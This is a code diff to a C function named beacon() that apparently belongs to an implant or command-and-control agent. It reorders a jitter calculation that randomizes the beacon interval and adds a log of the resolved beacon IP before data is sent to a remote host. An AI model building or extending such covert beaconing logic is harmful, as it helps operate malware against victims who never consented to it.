@@ -132,6 +132,16 @@ void *beacon(void *param)
 		secondsUp = GetSystemUpTime(); // Get system uptime
 		DLX(4, printf("\tSystem uptime is %ld\n", secondsUp));
 
+		if (beaconInfo->percentVariance > 0) {
+			DLX(4, printf("Variance = %f\n", beaconInfo->percentVariance));
+			jitter = calc_jitter(beaconInfo->interval, beaconInfo->percentVariance);	// Get jitter and calculate new interval
+			DLX(4, printf("Jitter = %d\n", jitter));
+			beaconInterval = beaconInfo->interval + jitter;
+			DLX(4, printf("Beacon Interval = %d\n", beaconInterval));
+		} else {
+			beaconInterval = beaconInfo->interval;
+		}
+
 		// Resolve beacon IP address
 		if (inet_pton(AF_INET, beaconInfo->host, &beaconIPaddr) <= 0) {		// Determine if beacon host is an name or dotted-quad address
 			for (i = 0; i < 2; i++) {
@@ -143,19 +153,11 @@ void *beacon(void *param)
 			if (beaconInfo->ip == NULL) {
 				DLX(4, printf("\tBeacon host could not be resolved.\n"));
 				goto sleep;		// Try again next beacon interval
+			} else {
+				DLX(4, printf("\tBeacon IP resolved to: %s\n", beaconInfo->ip));
 			}
 		} else
 			beaconInfo->ip = strdup(beaconInfo->host);		// IF beaconInfo-> host was an IP address, clone it (so it can be freed later)
-
-		if (beaconInfo->percentVariance > 0) {
-			DLX(4, printf("Variance = %f\n", beaconInfo->percentVariance));
-			jitter = calc_jitter(beaconInfo->interval, beaconInfo->percentVariance);	// Get jitter and calculate new interval
-			DLX(4, printf("Jitter = %d\n", jitter));
-			beaconInterval = beaconInfo->interval + jitter;
-			DLX(4, printf("Beacon Interval = %d\n", beaconInterval));
-		} else {
-			beaconInterval = beaconInfo->interval;
-		}
 
 		// TODO: SendBeaconData does not handle errors returned
 		DLX(4, printf("\tSending beacon\n"));
